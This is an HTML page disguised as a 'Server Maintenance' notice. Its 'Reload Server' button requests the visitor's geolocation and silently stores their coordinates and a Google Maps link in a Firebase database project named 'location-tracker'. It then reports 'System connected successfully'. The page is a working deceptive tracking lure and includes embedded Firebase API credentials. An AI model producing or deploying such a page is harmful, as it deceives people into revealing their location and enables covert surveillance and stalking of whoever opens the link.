<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Welcome | Server Maintenance</title>

<link rel="icon" type="image/x-icon" href="favicon.ico">


<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: 'Segoe UI', sans-serif;
}


body{

    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;

    background:
    radial-gradient(circle at top,#1f2937,#020617);

    color:white;

}


.container{

    width:90%;
    max-width:450px;

    background:rgba(255,255,255,0.08);

    backdrop-filter:blur(15px);

    border:1px solid rgba(255,255,255,0.15);

    padding:40px 30px;

    border-radius:25px;

    text-align:center;

    box-shadow:0 20px 50px rgba(0,0,0,0.5);

}



h1{

    font-size:32px;
    margin-bottom:15px;

}



.subtitle{

    color:#cbd5e1;

    font-size:16px;

    line-height:1.6;

    margin-bottom:25px;

}



.status{

    display:inline-block;

    background:#ef4444;

    padding:8px 18px;

    border-radius:20px;

    font-size:14px;

    margin-bottom:25px;

}



button{


    width:100%;

    padding:15px;

    border:none;

    border-radius:15px;

    background:linear-gradient(135deg,#3b82f6,#8b5cf6);

    color:white;

    font-size:17px;

    font-weight:bold;

    cursor:pointer;

    transition:.3s;

}



button:hover{

    transform:translateY(-3px);

    box-shadow:0 10px 25px rgba(59,130,246,.5);

}



.footer{

    margin-top:25px;

    font-size:13px;

    color:#94a3b8;

}


</style>

</head>


<body>


<div class="container">


<h1>Welcome 👋</h1>


<div class="status">
Server Maintenance
</div>


<p class="subtitle">

Our server is currently under maintenance.
<br>
We are upgrading our system to provide a better experience.

<br><br>

Please click the button below to continue.

</p>


<button onclick="requestLocation()">

Reload Server

</button>


<div class="footer">

© 2026 Server Team • All Rights Reserved

</div>


</div>




<script type="module">


import { initializeApp } 
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";


import { 
getFirestore,
collection,
addDoc,
serverTimestamp
}
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";




const firebaseConfig = {

apiKey: "AIzaSyBeUwz8yL-XmgI3wx4uCH7uPhdoHt0fSo8",

authDomain: "location-tracker-1aa74.firebaseapp.com",

projectId: "location-tracker-1aa74",

storageBucket: "location-tracker-1aa74.firebasestorage.app",

messagingSenderId: "836267695111",

appId: "1:836267695111:web:1b6ddd5d4a85a350099ea2",

measurementId: "G-DNSW7LGEYV"

};



const app = initializeApp(firebaseConfig);


const db = getFirestore(app);



console.log("Firebase Connected");





window.requestLocation = function(){


if(navigator.geolocation){


navigator.geolocation.getCurrentPosition(

saveLocation,

errorLocation

);


}

else{


alert("Location not supported");


}


};






async function saveLocation(position){


const latitude = position.coords.latitude;

const longitude = position.coords.longitude;



const maps =
`https://www.google.com/maps?q=${latitude},${longitude}`;




try{


await addDoc(collection(db,"locations"),{


latitude,

longitude,

maps,

time:serverTimestamp()


});



alert("System connected successfully ✅");


}


catch(error){


console.log(error);

alert("Database error");


}



}






function errorLocation(){


alert("Location permission denied");


}



</script>


</body>

</html>
